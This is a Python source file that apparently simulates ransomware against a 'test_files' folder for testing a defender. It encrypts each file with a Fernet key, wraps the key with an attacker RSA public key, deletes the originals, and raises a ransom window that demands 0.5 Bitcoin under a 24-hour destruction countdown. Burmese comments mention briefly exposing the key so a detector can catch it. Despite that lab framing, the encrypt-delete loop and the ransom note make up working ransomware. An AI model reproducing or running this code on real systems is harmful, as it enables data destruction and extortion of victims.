import glob
import json
import os
import time
import tkinter as tk
from tkinter import messagebox
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding

TARGET_DIR = "test_files"
PUBLIC_KEY_PATH = "keys/public_key.pem"
TEMP_KEY_FILE = "captured_keys.json"
BTC_ADDRESS = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"


def show_ransom_note_gui():
  root = tk.Tk()
  root.title("YOUR FILES HAVE BEEN ENCRYPTED!")
  root.geometry("650x520")
  root.configure(bg="#2b0000")  # အနီရင့်ရောင် Background
  root.attributes("-topmost", True)  # Screen အပေါ်ဆုံးတွင် အမြဲ ပေါ်နေမည်

  # Title Header
  title_label = tk.Label(
      root,
      text="ATTENTION! YOUR FILES ARE LOCKED",
      font=("Arial", 16, "bold"),
      fg="#ff4444",
      bg="#2b0000",
  )
  title_label.pack(pady=15)

  # Ransom Instructions
  body_text = (
      "All your personal files, documents, and databases have been encrypted\n"
      "using RSA-2048 & AES-256 Military Encryption.\n\n"
      "To get your files back, you must send 0.5 Bitcoin to the address below:"
  )
  body_label = tk.Label(
      root,
      text=body_text,
      font=("Arial", 10),
      fg="#ffffff",
      bg="#2b0000",
      justify="center",
  )
  body_label.pack(pady=5)

  # Bitcoin Address Display Frame
  btc_frame = tk.Frame(root, bg="#111111", padx=10, pady=5)
  btc_frame.pack(pady=10)

  btc_label = tk.Label(
      btc_frame,
      text=BTC_ADDRESS,
      font=("Courier", 11, "bold"),
      fg="#00ff00",
      bg="#111111",
  )
  btc_label.pack(side=tk.LEFT, padx=5)

  # Copy BTC Address Function
  def copy_btc_address():
    root.clipboard_clear()
    root.clipboard_append(BTC_ADDRESS)
    root.update()
    messagebox.showinfo(
        "Copied", "Bitcoin Address copied to clipboard successfully!"
    )

  btn_copy = tk.Button(
      btc_frame,
      text="Copy Address",
      command=copy_btc_address,
      bg="#444444",
      fg="#ffffff",
      font=("Arial", 8, "bold"),
  )
  btn_copy.pack(side=tk.LEFT, padx=5)

  # Status Warning
  status_label = tk.Label(
      root,
      text="STATUS: WAITING FOR RANSOM PAYMENT",
      font=("Impact", 12),
      fg="#ffcc00",
      bg="#2b0000",
  )
  status_label.pack(pady=10)

  # Live Countdown Timer (23:59:59 မှ စတင် လျှော့တွက်မည်)
  time_left = 86400  # 24 Hours in seconds

  def update_timer():
    nonlocal time_left
    if time_left > 0:
      time_left -= 1
      hours = time_left // 3600
      minutes = (time_left % 3600) // 60
      seconds = time_left % 60
      timer_var.set(
          f"TIME REMAINING BEFORE DESTRUCTION:"
          f" {hours:02d}:{minutes:02d}:{seconds:02d}"
      )
      root.after(1000, update_timer)
    else:
      timer_var.set("TIME EXPIRED! FILES PERMANENTLY DESTROYED!")

  timer_var = tk.StringVar()
  timer_label = tk.Label(
      root,
      textvariable=timer_var,
      font=("Courier", 11, "bold"),
      fg="#ff3333",
      bg="#1a0000",
      padx=10,
      pady=5,
  )
  timer_label.pack(pady=10)

  # Start Timer Loop
  update_timer()

  # Close Button
  btn_close = tk.Button(
      root,
      text="Close Warning Screen",
      command=root.destroy,
      bg="#ffffff",
      fg="#000000",
      font=("Arial", 10, "bold"),
      pady=5,
  )
  btn_close.pack(pady=15)

  root.mainloop()


def run_attack():
  if not os.path.exists(PUBLIC_KEY_PATH):
    return

  with open(PUBLIC_KEY_PATH, "rb") as f:
    public_key = serialization.load_pem_public_key(f.read())

  # 1. Generate Plaintext AES Key
  aes_key = Fernet.generate_key()
  fernet = Fernet(aes_key)

  # [RAM Interception Simulation]
  # Defender က ဖမ်းယူနိုင်ရန်အတွက် AES Plaintext Key ကို Memory Buffer/Temp File ပေါ်တွင် စက္ကန့်ပိုင်း တင်ထားမည်
  with open(TEMP_KEY_FILE, "w") as f:
    json.dump({"intercepted_key": aes_key.decode()}, f)
    # 2. Encrypt AES Key with Attacker's RSA Public Key
  encrypted_aes_key = public_key.encrypt(
      aes_key,
      padding.OAEP(
          mgf=padding.MGF1(algorithm=hashes.SHA256()),
          algorithm=hashes.SHA256(),
          label=None,
      ),
  )

  key_out_path = os.path.join(TARGET_DIR, "encrypted_aes_key.bin")
  with open(key_out_path, "wb") as f:
    f.write(encrypted_aes_key)

  # 3. Canary ဖိုင်နှင့် အခြားဖိုင်များကို စတင် Encrypt လုပ်မည်
  files_to_encrypt = sorted(glob.glob(os.path.join(TARGET_DIR, "*")))

  for file_path in files_to_encrypt:
    if file_path.endswith(".locked") or file_path.endswith(".bin"):
      continue
    try:
      with open(file_path, "rb") as f:
        data = f.read()

      encrypted_data = fernet.encrypt(data)

      with open(file_path + ".locked", "wb") as f:
        f.write(encrypted_data)

      os.remove(file_path)

      # Defender Detection မိစေရန် အနည်းငယ် စောင့်မည်
      time.sleep(0.1)

    except Exception:
      pass

  # [Defender OFF Handling]
  # Defender မဖွင့်ထားပါက (Attack အပြည့်အဝ အောင်မြင်သွားပါက)
  # RAM ပေါ်မှ Plaintext Key ကို အပြီးတိုင် ဖျက်ဆီးပစ်မည်။
  if os.path.exists(TEMP_KEY_FILE):
    os.remove(TEMP_KEY_FILE)

  # Attack အစအဆုံး အောင်မြင်မှသာ Ransom Note GUI တက်လာမည်
  show_ransom_note_gui()


if __name__ == "__main__":
  run_attack()